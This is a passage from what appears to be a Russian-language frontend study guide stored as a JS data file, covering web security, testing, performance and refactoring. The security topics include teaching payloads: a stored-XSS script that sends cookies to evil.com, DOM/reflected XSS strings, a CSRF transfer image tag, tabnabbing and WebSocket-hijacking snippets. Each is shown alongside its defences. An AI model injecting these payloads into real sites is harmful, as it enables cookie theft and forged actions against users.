**In-memory (переменная в JS)** — самый безопасный для access token. Но теряется при перезагрузке страницы.

**Token rotation паттерн (лучшая практика):**
\`\`\`
access token  → 15 мин, хранить in-memory
refresh token → 7 дней, хранить в httpOnly cookie
\`\`\`
\`\`\`js
// access истёк → отправляем refresh token:
POST /auth/refresh
Cookie: refresh_token=xyz  // браузер шлёт автоматически

// Сервер:
// 1. Проверяет refresh token (хэш в БД)
// 2. Выдаёт новый access token
// 3. Ротирует refresh token (старый инвалидируется)
Response: { accessToken: 'new_jwt' }
\`\`\`
Ротация refresh при каждом обновлении — если украли refresh, его использование сразу видно (старый уже невалиден).

---

**OAuth 2.0** — протокол делегированной авторизации. Позволяет дать приложению доступ к ресурсам пользователя без передачи пароля.

**Authorization Code + PKCE** — стандартный flow для SPA и мобильных:
\`\`\`
1. Редирект на OAuth-провайдер (Google, GitHub)
2. Пользователь логинится у провайдера → соглашается дать доступ
3. Провайдер редиректит обратно с code
4. Клиент меняет code на access token (+ PKCE проверка)
5. Используем access token для API
\`\`\`
PKCE (Proof Key for Code Exchange) — защита от перехвата code: клиент генерирует случайный code_verifier, шлёт его хэш при старте, и сам verifier при обмене.

**Client Credentials** — server-to-server, без пользователя:
\`\`\`
POST /oauth/token
{ client_id, client_secret, grant_type: 'client_credentials' }
→ access token
\`\`\`
Микросервисы, фоновые задачи, cron-джобы.

**Implicit flow** — устарел, небезопасен. Токен приходил прямо в URL — виден в логах, истории браузера. Заменён на Authorization Code + PKCE.`,score:4},{name:"npm audit. SCA и SAST",level:"2",content:`**Почему зависимости — зона риска:**
Типичное React-приложение тянет 500-1000 пакетов транзитивно. Уязвимость в любом из них — потенциальный вектор атаки. Атаки на supply chain (цепочку поставок) — один из главных векторов последних лет: атакуют не твой код, а пакет который ты используешь.

**npm audit:**
Сравнивает дерево зависимостей с базой CVE (Common Vulnerabilities and Exposures). Показывает уязвимость, severity (low/moderate/high/critical), и через какой пакет она попадает.
\`\`\`bash
npm audit                  # показать все уязвимости
npm audit --audit-level=high  # выйти с ошибкой только при high/critical
npm audit fix              # обновить уязвимые пакеты (только semver-совместимые)
npm audit fix --force      # обновить даже с breaking changes — опасно
\`\`\`
\`npm audit fix --force\` может сломать приложение — пакет обновится до мажорной версии с другим API. Делать только осознанно с последующим тестированием.

**SCA (Software Composition Analysis)** — автоматизированный анализ зависимостей на уязвимости и лицензионные проблемы:
• **npm audit** — встроен в npm, базовый уровень
• **Snyk** — глубже чем npm audit, находит уязвимости которые audit пропускает, интегрируется в CI
• **Dependabot (GitHub)** — автоматически создаёт PR для обновления уязвимых пакетов

SCA отвечает на вопрос: *есть ли известные уязвимости в том что я использую?*

**SAST (Static Application Security Testing)** — анализ твоего собственного кода без его запуска. Ищет потенциально опасные паттерны:
• **ESLint + eslint-plugin-security** — находит eval(), небезопасные регулярки, объекты без hasOwnProperty
• **SonarQube / SonarCloud** — глубокий анализ: SQL injection, XSS, hardcoded secrets
• **Semgrep** — кастомные правила под свой стек

SAST отвечает на вопрос: *есть ли уязвимый код в том что я написал?*

SCA + SAST вместе — разные слои защиты: один смотрит на чужой код, другой на твой.`,score:3},{name:"Атрибут rel: noreferrer, noopener, nofollow",level:"3",content:'**Проблема без этих атрибутов:**\nПри открытии ссылки в новой вкладке (`target="_blank"`) новая страница получает доступ к `window.opener` — ссылке на вкладку которая её открыла. Атакующий может написать:\n```js\n// На evil.com, куда вела ссылка с вашего сайта:\nwindow.opener.location = \'https://fake-login.com\';\n// Пользователь смотрит на новую вкладку, а оригинальный сайт\n// незаметно заменился на фишинговую копию — это tabnabbing\n```\n\n**noopener** — блокирует доступ к `window.opener`. Новая вкладка открывается в отдельном процессе без связи с оригинальной:\n```html\n<a href="https://external.com" target="_blank" rel="noopener">\n```\n\n**noreferrer** — делает то же что noopener, плюс не передаёт заголовок `Referer`. Referer — это URL страницы, с которой пришёл пользователь. Без него внешний сайт не узнает откуда пришёл переход:\n```\n// Без noreferrer внешний сайт видит:\nReferer: https://yoursite.com/secret-page\n\n// С noreferrer — заголовок отсутствует\n```\nНорма: всегда писать `rel="noopener noreferrer"` вместе для target="_blank".\n\n**nofollow** — не про безопасность, а про SEO. Указание поисковым роботам не передавать «ссылочный вес» (PageRank) на эту страницу:\n```html\n<!-- Пользовательский контент, платные ссылки, недоверенные источники: -->\n<a href="https://sponsor.com" rel="nofollow">Реклама</a>\n```\nГугл требует nofollow для платных/рекламных ссылок — иначе это манипуляция поисковой выдачей.',score:3},{name:"CSP и X-Frame-Options",level:"3",content:`**CSP (Content Security Policy)** — HTTP-заголовок, который говорит браузеру откуда разрешено загружать ресурсы. Это второй рубеж защиты от XSS: даже если атакующий внедрил скрипт, браузер его не выполнит если домен не в белом списке.

**Почему нужен второй рубеж:**
Фильтрация и экранирование на сервере — первый рубеж. Но программисты делают ошибки. CSP — страховка: даже при пробитом первом рубеже инжектированный скрипт не запустится.

**Основные директивы:**
\`\`\`
Content-Security-Policy:
  default-src 'self';                    // по умолчанию — только свой домен
  script-src 'self' cdn.example.com;    // скрипты — свой домен + cdn
  style-src 'self' 'unsafe-inline';     // стили — свой домен + inline (нежелательно)
  img-src 'self' data: https:;          // картинки — свой домен + data URI + любой HTTPS
  connect-src 'self' api.example.com;  // fetch/XHR — свой домен + API
  font-src 'self' fonts.gstatic.com;   // шрифты
  frame-ancestors 'none';              // запрет встраивания в iframe (замена X-Frame-Options)
\`\`\`

**Inline-скрипты по умолчанию запрещены** — это ключевая защита. \`<script>alert(1)<\/script>\` из XSS не выполнится.

Если нужны inline-скрипты (React/Vite часто генерируют) — использовать nonce:
\`\`\`html
<!-- Сервер генерирует случайный nonce при каждом запросе -->
<script nonce="r4nd0m123">...<\/script>
\`\`\`
\`\`\`
Content-Security-Policy: script-src 'nonce-r4nd0m123';
\`\`\`

**Report-Only режим** — не блокирует, только сообщает о нарушениях. Используют для тестирования CSP перед включением:
\`\`\`
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
\`\`\`

**X-Frame-Options** — запрещает встраивание сайта в \`<iframe>\`. Защита от **clickjacking**: атакующий встраивает твой сайт в прозрачный iframe поверх своей страницы — пользователь думает что кликает по кнопке на чужом сайте, а на самом деле нажимает кнопку на твоём (например "Перевести деньги"):
\`\`\`
X-Frame-Options: DENY          // нельзя встроить нигде
X-Frame-Options: SAMEORIGIN    // только на своём домене
\`\`\`
Современная альтернатива: \`frame-ancestors\` директива в CSP — гибче, поддерживает несколько доменов.`,score:3.5},{name:"CORS",level:"3",content:`**Зачем вообще существует Same-Origin Policy:**
Браузер по умолчанию запрещает JS на одном домене читать ответы с другого. Без этого любой сайт мог бы в фоне делать запросы от твоего имени — читать почту, банковский счёт, отправлять формы. CORS — механизм, позволяющий серверу явно разрешить доступ с конкретных доменов.

**Origin = протокол + домен + порт.** Разные origin:
\`\`\`
https://site.com  vs  http://site.com    // разный протокол
https://site.com  vs  https://api.com    // разный домен
https://site.com  vs  https://site.com:8080  // разный порт
\`\`\`

**Простые запросы** (GET, POST с обычными заголовками) — браузер шлёт запрос с заголовком Origin, сервер отвечает с Access-Control-Allow-Origin. Если домен не совпадает — браузер блокирует чтение ответа (запрос дошёл до сервера, браузер просто не даёт JS прочитать результат).

**Preflight (предварительный запрос)** — для "сложных" запросов (PUT, DELETE, PATCH, кастомные заголовки типа Authorization): браузер сначала шлёт OPTIONS, спрашивая разрешение, и только при положительном ответе шлёт настоящий запрос:
\`\`\`
// Браузер автоматически:
OPTIONS /api/users
Origin: https://frontend.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization

// Сервер должен ответить:
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Authorization
Access-Control-Max-Age: 86400  // кэшировать preflight на сутки
\`\`\`

**CORS с credentials (cookies, Authorization):**
\`\`\`js
// Клиент должен явно указать:
fetch('https://api.com/data', { credentials: 'include' });
\`\`\`
\`\`\`
// Сервер ОБЯЗАН ответить конкретным доменом (не *):
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Credentials: true
\`\`\`
\`Access-Control-Allow-Origin: *\` + \`credentials: include\` — не работает. Это намеренное ограничение: нельзя разрешить всем сайтам слать куки.

**CORS — это защита браузера, не сервера.** Curl или Postman не соблюдают CORS — они просто шлют запросы. CORS защищает от атак через браузер пользователя, не от прямых запросов к API.`,score:3.5},{name:"XSS",level:"3",content:"**XSS (Cross-Site Scripting)** — атака при которой вредоносный JS выполняется в браузере жертвы в контексте доверенного сайта. Атакующий получает те же права что и сам сайт: читает куки, localStorage, делает запросы от имени пользователя, меняет DOM.\n\n**Stored XSS (хранимый)** — скрипт сохраняется в БД и показывается всем пользователям:\n```\nАтакующий пишет комментарий: <script>fetch('evil.com?c='+document.cookie)<\/script>\nСервер сохраняет это в БД.\nДругой пользователь открывает страницу → браузер выполняет скрипт → куки улетают.\n```\nСамый опасный тип — автоматически поражает всех посетителей.\n\n**Reflected XSS (отражённый)** — скрипт передаётся в URL и сервер отражает его обратно в HTML:\n```\nhttps://site.com/search?q=<script>alert(1)<\/script>\nСервер: <h1>Результаты для: <script>alert(1)<\/script></h1>\n```\nЖертву нужно заставить перейти по специально сформированной ссылке (фишинг, спам).\n\n**DOM-based XSS** — сервер не при делах, уязвимость в клиентском JS:\n```js\n// Берём значение из URL и суём в DOM без проверки:\nconst name = location.hash.slice(1);\ndocument.getElementById('greeting').innerHTML = 'Привет, ' + name;\n// URL: https://site.com/page#<img src=x onerror=alert(1)>\n```\nОпасные источники: `location.hash`, `location.search`, `document.referrer`.\nОпасные получатели: `innerHTML`, `outerHTML`, `document.write`, `eval`.\n\n**Как React защищает по умолчанию:**\nJSX экранирует всё что выводится через `{}`. `<` превращается в `&lt;`, `>` в `&gt;` и т.д. — строка рендерится как текст, не как HTML:\n```jsx\nconst userInput = '<script>alert(1)<\/script>';\n<div>{userInput}</div>\n// В DOM: <div>&lt;script&gt;alert(1)&lt;/script&gt;</div> — безопасно\n```\n\n**Где React НЕ защищает:**\n```jsx\n// dangerouslySetInnerHTML — вставляет HTML как есть:\n<div dangerouslySetInnerHTML={{ __html: userInput }} /> // ❌\n\n// href с javascript: — выполнится при клике:\n<a href={userUrl}>link</a> // если userUrl = 'javascript:alert(1)' — ❌\n// Защита: проверять что href начинается с https://, не с javascript:\n```\n\n**Полная защита:**\n• React JSX — включена по умолчанию\n• Санитизация через DOMPurify перед dangerouslySetInnerHTML\n• CSP заголовок — запрещает inline-скрипты и внешние домены\n• HttpOnly cookies — украденные через XSS куки нельзя прочитать через JS\n• Валидация href/src атрибутов если они из пользовательских данных",score:3.5},{name:"CSRF",level:"3",content:`**CSRF (Cross-Site Request Forgery)** — атака при которой браузер жертвы отправляет запрос на доверенный сайт от её имени, без её ведома.

**Почему это работает — браузер автоматически шлёт куки:**
\`\`\`
1. Пользователь залогинен на bank.com (в браузере есть cookie с сессией)
2. Пользователь заходит на evil.com
3. evil.com содержит:
   <img src="https://bank.com/transfer?to=attacker&amount=10000">
   или форму которая автоматически сабмитится через JS
4. Браузер делает запрос на bank.com — и автоматически прикрепляет cookie
5. Банк видит валидную сессию и выполняет перевод
\`\`\`
Пользователь ничего не нажимал — браузер сделал всё сам.

**Защита 1 — CSRF-токен:**
Сервер генерирует уникальный случайный токен, кладёт его в форму (скрытое поле) и в сессию. При запросе сравнивает. Атакующий не знает этот токен — не может сформировать валидный запрос:
\`\`\`html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="r4nd0m_s3cr3t">
  ...
</form>
\`\`\`

**Защита 2 — SameSite cookie:**
Атрибут куки, указывающий браузеру когда слать куки в кросс-доменных запросах:
\`\`\`
SameSite=Strict  — куки шлются ТОЛЬКО при навигации с того же домена.
                   Даже переход по ссылке с другого сайта не пришлёт куки.
                   Ломает OAuth-редиректы — редко используют для session cookie.

SameSite=Lax     — куки шлются при навигации (ссылки, адресная строка),
                   но НЕ при автоматических запросах (img, form POST, XHR).
                   Дефолт в современных браузерах. Хороший баланс.

SameSite=None    — куки шлются всегда. Требует Secure (только HTTPS).
                   Для третьесторонних куки (трекинг, виджеты).
\`\`\`
Lax защищает от большинства CSRF-атак — форма на evil.com, сабмитящаяся в bank.com, не получит куки.

**Защита 3 — проверка Origin/Referer заголовка:**
Сервер проверяет откуда пришёл запрос. Если Origin не совпадает с доверенным доменом — отклоняет.

**Почему JWT в Authorization header защищает от CSRF:**
Браузер автоматически шлёт только куки. Authorization header атакующий из кросс-доменного запроса добавить не может — для этого нужен JS, а JS заблокирует CORS. Поэтому API с токеном в заголовке CSRF-безопасны без дополнительных мер.`,score:3.5},{name:"Безопасность JWT",level:"3",content:`**JWT (JSON Web Token)** — три части через точку: \`header.payload.signature\`, каждая в Base64.
\`\`\`
eyJhbGciOiJIUzI1NiJ9  ← header: { alg: "HS256" }
.eyJ1c2VySWQiOjQyfQ    ← payload: { userId: 42, exp: 1716000000 }
.SflKxwRJSMeKKF2QT4fw  ← подпись (HMAC SHA256 от header+payload с секретным ключом)
\`\`\`

**JWT не шифрует — только подписывает.** Payload декодируется любым base64-декодером без ключа. Не класть в payload: пароли, секреты, персональные данные которые не должны видеть клиенты.

**Атака: alg=none:**
Оригинальная уязвимость JWT. Атакующий меняет алгоритм в header на \`none\` и убирает подпись — некоторые библиотеки принимали такой токен как валидный:
\`\`\`js
// Уязвимая проверка:
jwt.verify(token); // не указан алгоритм

// Безопасная:
jwt.verify(token, secret, { algorithms: ['HS256'] }); // явно указать алгоритм
\`\`\`

**Атака: алгоритм confusion (RS256 → HS256):**
Асимметричный RS256 использует пару: приватный ключ для подписи, публичный для проверки. Публичный ключ — публичный по определению. Атакующий меняет алгоритм на симметричный HS256 и подписывает токен публичным ключом как HMAC-секретом. Уязвимая библиотека проверяет его тем же публичным ключом и принимает.

Защита: всегда явно указывать ожидаемый алгоритм.

**Нельзя мгновенно инвалидировать:**
JWT stateless — сервер не хранит список токенов. Если украли access token — он работает до exp. Решения:
• Короткий срок жизни (15 мин) — украденный токен быстро протухнет
• Blacklist (список отозванных jti) — нарушает stateless, но даёт мгновенную инвалидацию
• Версия в токене — при логауте инкрементировать версию в БД, проверять при запросах

**Где хранить (повторение из темы Auth, ключевое):**
\`\`\`
localStorage  — читается JS → украдут через XSS ❌
Cookie без httpOnly — то же самое ❌
httpOnly cookie — JS не читает, CSRF защищён SameSite=Lax ✅
in-memory (переменная) — исчезает при перезагрузке, самое безопасное ✅
\`\`\`

**Когда JWT лучше session:**
Микросервисы — каждый сервис проверяет подпись локально без запроса к хранилищу сессий. Горизонтальное масштабирование — не нужен общий Redis.`,score:3.5},{name:"Работа SSL/TLS",level:"4",content:`**Зачем нужен TLS:**
Без шифрования все данные между браузером и сервером передаются в открытом виде. Любой узел на пути (провайдер, роутер, публичный Wi-Fi) может прочитать или подменить данные. MITM (Man-in-the-Middle) атака: атакующий встаёт между клиентом и сервером, расшифровывает и перешифровывает трафик — обе стороны думают что разговаривают напрямую.

TLS решает три задачи:
• **Шифрование** — данные нечитаемы для третьих лиц
• **Аутентификация сервера** — клиент знает что говорит именно с bank.com, а не с подменой
• **Целостность** — данные не изменены в пути (MAC проверка)

**TLS Handshake (TLS 1.3 — упрощённо):**
\`\`\`
1. ClientHello
   Клиент → сервер: поддерживаемые алгоритмы, случайное число (client random)

2. ServerHello + Certificate + Key Exchange
   Сервер → клиент: выбранный алгоритм, свой публичный ключ (DH),
   сертификат (подписан CA)

3. Клиент проверяет сертификат:
   - Подпись валидна? (доверяем CA из системного хранилища)
   - Домен совпадает? (CN или SAN)
   - Не истёк? (срок действия)

4. Обмен ключами (Diffie-Hellman):
   Оба вычисляют один и тот же сессионный ключ
   не передавая его по сети — математика DH позволяет это

5. Всё дальнейшее шифруется симметричным ключом (AES)
\`\`\`
TLS 1.3 — 1 RTT (round trip) вместо 2 у TLS 1.2. Быстрее.

**Сертификаты и цепочка доверия:**
Сертификат = "я bank.com, вот моя подпись от Comodo". Браузер доверяет Comodo потому что тот в системном хранилище корневых CA. Цепочка: Root CA → Intermediate CA → Сертификат сайта.

Let's Encrypt — бесплатный CA, автоматизированный через ACME-протокол. Стандарт для большинства сайтов.

**HSTS (HTTP Strict Transport Security):**
\`\`\`
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
\`\`\`
Говорит браузеру: всегда используй HTTPS для этого домена, даже если набрали http://. Защита от SSL stripping атаки (атакующий подменяет HTTPS-редирект и принуждает браузер работать по HTTP).`,score:3.5},{name:"Организация безопасности при реализации WebSocket-ов",level:"4",content:`**Чем WebSocket отличается от HTTP с точки зрения безопасности:**
WebSocket — persistent-соединение. После handshake между клиентом и сервером открыт постоянный канал. Это меняет модель угроз: атакующий не просто перехватывает один запрос, а может влиять на весь поток сообщений.

**Угроза 1 — CSWSH (Cross-Site WebSocket Hijacking):**
Аналог CSRF для WebSocket. Браузер при WebSocket-handshake автоматически шлёт куки. Атакующий с evil.com может открыть WebSocket на victim.com от имени жертвы:
\`\`\`js
// На evil.com:
const ws = new WebSocket('wss://victim.com/ws');
// Браузер прикрепит куки жертвы к handshake
ws.onmessage = (e) => sendToAttacker(e.data); // читает данные жертвы
\`\`\`

**Защита от CSWSH — проверка Origin при handshake:**
\`\`\`js
// Сервер при WebSocket upgrade:
const origin = request.headers['origin'];
if (!allowedOrigins.includes(origin)) {
  socket.destroy(); // закрыть соединение
  return;
}
\`\`\`
Origin нельзя подделать из браузера — это защищённый заголовок.

**Угроза 2 — отсутствие аутентификации в сообщениях:**
Проверить аутентификацию нужно при handshake, не полагаться только на куки:
\`\`\`js
// Вариант 1: токен в URL (виден в логах — нежелательно):
new WebSocket('wss://api.com/ws?token=xxx');

// Вариант 2: первым сообщением после подключения:
ws.onopen = () => ws.send(JSON.stringify({ type: 'auth', token: getAccessToken() }));
// Сервер ждёт auth-сообщение, при неверном токене закрывает соединение

// Вариант 3: cookie + CSWSH защита (Origin check)
\`\`\`

**Угроза 3 — инъекции через сообщения:**
Все входящие сообщения — пользовательские данные. Валидировать обязательно:
\`\`\`js
ws.on('message', (data) => {
  const msg = JSON.parse(data);
  // Проверить схему: тип, длину, формат
  if (!isValidMessage(msg)) { ws.close(); return; }
  // Не eval, не innerHTML без санитизации
});
\`\`\`

**Угроза 4 — flood / DDoS:**
Один клиент может заспамить тысячи сообщений в секунду. Rate limiting на уровне соединения:
\`\`\`js
// Отслеживать количество сообщений за интервал,
// при превышении — предупреждение, потом закрытие соединения
\`\`\`

**WSS (WebSocket Secure)** — WebSocket поверх TLS. Всегда использовать в продакшне — шифрует канал, защищает от перехвата.`,score:3.5}]},{id:"testing",title:"ТЕСТИРОВАНИЕ",icon:"🧪",color:"#26A69A",topics:[{name:"Паттерн AAA (Arrange Act Assert)",level:"2",content:`\`\`\`js
// Arrange — подготовка
const calculator = new Calculator();

// Act — действие
const result = calculator.add(2, 3);

// Assert — проверка
expect(result).toBe(5);
\`\`\`

Каждый тест — одно действие, одна проверка. Чистый и читаемый.`},{name:"Моки. Зачем нужны и как применять",level:"3",content:`**Mock** — подделка зависимости с контролируемым поведением.

\`\`\`js
const mockFetch = jest.fn().mockResolvedValue({ json: () => ({ name: 'Alice' }) });
global.fetch = mockFetch;

await loadUser();

expect(mockFetch).toHaveBeenCalledWith('/api/user');
\`\`\`

Зачем: изоляция тестируемого кода, предсказуемость, скорость (не ждём реальный API).`},{name:"Stub, Spy. Зачем нужны и как применять",level:"3",content:`**Stub** — заглушка, возвращающая фиксированное значение. Не проверяем вызов.
\`\`\`js
const getUser = jest.fn().mockReturnValue({ name: 'Alice' });
\`\`\`

**Spy** — наблюдатель, следит за вызовами реального метода без подмены:
\`\`\`js
const spy = jest.spyOn(console, 'log');
doSomething();
expect(spy).toHaveBeenCalledWith('done');
spy.mockRestore();
\`\`\`

**Mock** = Stub + Spy (подменяет и отслеживает).`},{name:"Принцип TDD",level:"3",content:`**TDD (Test-Driven Development):**
1. **Red** — пишем тест → он падает (функционал не реализован)
2. **Green** — пишем минимальный код, чтобы тест прошёл
3. **Refactor** — улучшаем код, тесты продолжают проходить

Преимущества: лучший дизайн кода, высокое покрытие, документация через тесты, уверенность при рефакторинге.`},{name:"Интеграционные и e2e тесты (cypress / playwright)",level:"3",content:`**Unit** — одна функция/компонент в изоляции.
**Интеграционные** — несколько модулей вместе (API + компонент).
**E2E** — полный пользовательский сценарий в реальном браузере.

**Cypress:** JS-фреймворк, работает в браузере, time-travel debugging, автоматические ожидания.
**Playwright:** от Microsoft, мультибраузерный (Chromium, Firefox, WebKit), быстрее, API для мобильных.`},{name:"Пирамида тестирования, инструменты для каждого уровня",level:"3",content:`\`\`\`
       /  E2E  \\       — мало, медленные, дорогие
      / Integration \\   — средне
     /    Unit       \\  — много, быстрые, дешёвые
\`\`\`

**Unit:** Jest, Vitest, React Testing Library
**Integration:** Jest + MSW (Mock Service Worker), Supertest
**E2E:** Cypress, Playwright

**Перевёрнутая пирамида** — антипаттерн: много E2E, мало Unit. Медленные, хрупкие тесты.`},{name:"Coverage. Инструменты и принцип работы",level:"4",content:`**Coverage** — процент кода, выполненного при прогоне тестов.

**Метрики:**
• **Statements** — % выполненных выражений
• **Branches** — % пройденных ветвлений (if/else, switch)
• **Functions** — % вызванных функций
• **Lines** — % выполненных строк

**Инструменты:** istanbul/nyc, Jest --coverage, Vitest --coverage, c8.

**Важно:** 100% coverage ≠ качественные тесты. Можно покрыть всё без проверки правильности. Coverage — метрика полноты, не качества.`},{name:"Unit тестирование",level:"2",content:`Тестирование отдельной функции/компонента в изоляции.

**React Testing Library:**
\`\`\`js
render(<Button label="Click" onClick={mockFn} />);
const btn = screen.getByText('Click');
fireEvent.click(btn);
expect(mockFn).toHaveBeenCalled();
\`\`\`

Принцип: тестируй поведение, не реализацию. Query по тексту/роли, не по className.`}]},{id:"exceptions",title:"ОБРАБОТКА ИСКЛЮЧЕНИЙ, ЛОГИРОВАНИЕ, ДЕБАГ",icon:"🐛",color:"#FF7043",topics:[{name:"try-catch",level:"2",content:`\`\`\`js
try {
  riskyOperation();
} catch (error) {
  console.error(error.message);
} finally {
  cleanup(); // всегда выполняется
}
\`\`\`

**finally** — выполняется всегда (и при ошибке, и без).

**Не ловит:** асинхронные ошибки (setTimeout, Promise). Для промисов — .catch() или try/catch с await.

**Custom Error:**
\`\`\`js
class ValidationError extends Error {
  constructor(message, field) {
    super(message);
    this.name = 'ValidationError';
    this.field = field;
  }
}
\`\`\``},{name:"Способы дебага клиентского кода",level:"2",content:`• **console.log/warn/error/table/group/time** — базовое логирование
• **debugger** — программный breakpoint
• **DevTools breakpoints** — line, conditional, DOM, XHR, event
• **Source maps** — маппинг минифицированного кода на исходный
• **Network tab** — анализ запросов и ответов
• **Performance tab** — профилирование
• **React DevTools** — дерево компонентов, props, state, profiler`},{name:"redux/react/альтернативы devtools",level:"3",content:`**React DevTools:** дерево компонентов, props, state, hooks, profiler (перерендеры), highlight updates.

**Redux DevTools:** time-travel debugging, просмотр всех actions и state diff, импорт/экспорт состояния.

**Vue DevTools, MobX DevTools, Zustand DevTools** — аналогичные инструменты для своих экосистем.`},{name:"Настройка логирования ошибок (sentry, prometheus и др.)",level:"4",content:`**Sentry** — мониторинг ошибок в реальном времени:
• Автоматический перехват ошибок (window.onerror, unhandledrejection)
• Source maps для читаемых stack traces
• Breadcrumbs — цепочка действий перед ошибкой
• Release tracking — привязка ошибок к версиям
• Performance monitoring

**Prometheus + Grafana** — метрики (больше для backend/инфраструктуры).

**LogRocket / FullStory** — session replay + логирование.`},{name:"Понимание принципа выделения программных узлов для логирования",level:"4",content:`**Что логировать:**
• API-вызовы (запрос, ответ, ошибки)
• Действия пользователя (навигация, клики на ключевые элементы)
• Ошибки рендеринга (ErrorBoundary)
• Бизнес-логика (переходы состояний, транзакции)
• Производительность (долгие операции, медленные рендеры)

**Уровни логирования:** debug, info, warn, error, fatal.

**Не логировать:** чувствительные данные (пароли, токены, персональные данные — GDPR!).`}]},{id:"perf",title:"ПРОИЗВОДИТЕЛЬНОСТЬ",icon:"🚀",color:"#FFC107",topics:[{name:"Инструменты проверки производительности (devtools, lighthouse)",level:"2",content:`**Lighthouse:** аудит Performance, Accessibility, SEO, Best Practices. Даёт оценку 0-100 и рекомендации.

**DevTools Performance tab:** запись и анализ. Flame chart — визуализация стека вызовов. Main thread — видно что блокирует.

**WebPageTest** — тестирование из разных локаций и устройств.
**Chrome UX Report** — реальные данные пользователей.`},{name:"Preload, prefetch, async, defer",level:"2",content:'**Scripts:**\n```html\n<script src="app.js"><\/script>           <!-- блокирует парсинг -->\n<script src="app.js" async><\/script>     <!-- загружает параллельно, выполняет сразу -->\n<script src="app.js" defer><\/script>     <!-- загружает параллельно, выполняет после парсинга -->\n```\n\n**Resource hints:**\n```html\n<link rel="preload" href="font.woff2" as="font">   <!-- загрузить сейчас (критический ресурс) -->\n<link rel="prefetch" href="next-page.js">           <!-- загрузить потом (для будущей навигации) -->\n<link rel="preconnect" href="https://api.com">      <!-- установить соединение заранее -->\n```'},{name:"Метрики клиентской производительности",level:"3",content:`**Core Web Vitals:**
• **LCP (Largest Contentful Paint)** — время отрисовки самого большого элемента. Хорошо: < 2.5s
• **FID (First Input Delay)** / **INP (Interaction to Next Paint)** — задержка реакции на ввод. Хорошо: < 100ms
• **CLS (Cumulative Layout Shift)** — визуальная стабильность (прыжки элементов). Хорошо: < 0.1

**Другие:**
• **FCP (First Contentful Paint)** — первый контент на экране
• **TTFB (Time To First Byte)** — время до первого байта ответа
• **TTI (Time To Interactive)** — когда страница полностью интерактивна`},{name:"Механизмы уменьшения размера бандла, CDN",level:"3",content:`**Уменьшение бандла:**
• **Tree shaking** — удаление неиспользуемого кода (ES modules)
• **Code splitting** — разделение на чанки (React.lazy, dynamic import)
• **Minification** — сжатие кода (Terser)
• **Compression** — gzip, Brotli
• **Анализ бандла** — webpack-bundle-analyzer, source-map-explorer

**CDN (Content Delivery Network):**
Сеть серверов по всему миру. Ресурсы раздаются с ближайшего сервера → меньше latency.
Кэширование на edge-серверах. Защита от DDoS.

**Оптимизация изображений (критично для LCP):**
• Использовать **WebP/AVIF** вместо JPEG/PNG (–25-50% размера)
• **srcset + sizes** — браузер сам выбирает нужный размер, не грузит лишнего
• **loading="lazy"** — для изображений below the fold
• **decoding="async"** — не блокирует main thread при декодировании
• CDN с auto-format (Cloudinary, imgix — автоматически конвертируют в WebP/AVIF)
\`\`\`html
<picture>
  <source srcset="hero.avif" type="image/avif">
  <source srcset="hero.webp" type="image/webp">
  <img
    src="hero.jpg"
    srcset="hero-400.jpg 400w, hero-800.jpg 800w"
    sizes="(max-width: 600px) 100vw, 800px"
    loading="eager"
    fetchpriority="high"
    alt="..."
  />
</picture>
\`\`\`
**fetchpriority="high"** — для LCP-изображения (выше preload в очереди загрузки).`},{name:"Lazy-loading, оптимизация критичного пути",level:"4",content:`**Critical Rendering Path:** HTML → DOM + CSSOM → Render Tree → Layout → Paint.

**Оптимизация:**
• Inline critical CSS (above-the-fold)
• Defer non-critical CSS
• Lazy-load изображений: \`loading="lazy"\`
• Lazy-load компонентов: React.lazy + Suspense
• Минимизировать блокирующие ресурсы
• Preload критических ресурсов

**Intersection Observer:**
\`\`\`js
const observer = new IntersectionObserver((entries) => {
  entries.forEach(e => { if (e.isIntersecting) loadImage(e.target); });
});
\`\`\``},{name:"Метрики серверной производительности",level:"4",content:`**TTFB** — время до первого байта. Зависит от сервера, БД, сети.
**Server Response Time** — время обработки запроса.
**Throughput** — количество запросов в секунду.
**Error Rate** — процент ошибочных ответов.

**Мониторинг:** New Relic, DataDog, Prometheus + Grafana.

**Оптимизация:** кэширование (Redis), CDN, оптимизация запросов к БД, horizontal scaling.`}]},{id:"refactoring",title:"РЕФАКТОРИНГ",icon:"🔧",color:"#8D6E63",topics:[{name:"Правила работы с комментариями при рефакторинге",level:"2",content:`**Хорошие комментарии:**
• Объясняют ПОЧЕМУ, а не ЧТО
• TODO / FIXME / HACK с обоснованием
• JSDoc для публичных API
• Регулярные выражения и сложные алгоритмы

**Плохие комментарии:**
• Описывают очевидный код
• Устаревшие (не обновлены при рефакторинге)
• Закомментированный код (удаляй, git помнит)

**Правило:** если код требует комментария — сначала попробуй сделать код понятнее (переименовать, выделить функцию).`},{name:"Основные принципы рефакторинга",level:"3",content:`**Рефакторинг** — изменение внутренней структуры без изменения поведения.

**Принципы:**
• Маленькие шаги + тесты после каждого шага
• Не менять поведение и рефакторить одновременно
• Тесты — safety net (без тестов рефакторинг рискован)
• Роль тестов при рефакторинге — они ДОЛЖНЫ проходить после каждого изменения

**Цели рефакторинга:** улучшить читаемость, убрать дублирование, упростить поддержку, подготовить к новой фиче.`},{name:"Признаки грязного кода",level:"3",content:`**Code Smells:**
• **Длинные функции/методы** (> 20-30 строк)
• **Дублирование кода**
• **Магические числа** (42 вместо MAX_RETRIES)
• **Глубокая вложенность** (if внутри if внутри if)
• **Большие классы / God Object** (один класс делает всё)
• **Feature Envy** — метод больше работает с чужими данными, чем со своими
• **Длинные списки параметров** (> 3 — используй объект)
• **Мёртвый код** — недостижимый или неиспользуемый
• **Shotgun Surgery** — одно изменение требует правок в 10 местах`},{name:"Применять различные методы рефакторинга",level:"3",content:`**Извлечение метода:**
\`\`\`js
// До
function process() { /* 50 строк */ }

// После
function process() {
  validate();
  transform();
  save();
}
\`\`\`

**Извлечение переменной** — сложное выражение → именованная переменная.
**Инкапсуляция полей** — прямой доступ → геттеры/сеттеры.
**Разбиение условного оператора** — сложный if → функции с говорящими именами.
**Замена магических чисел** — константы с понятным именем.
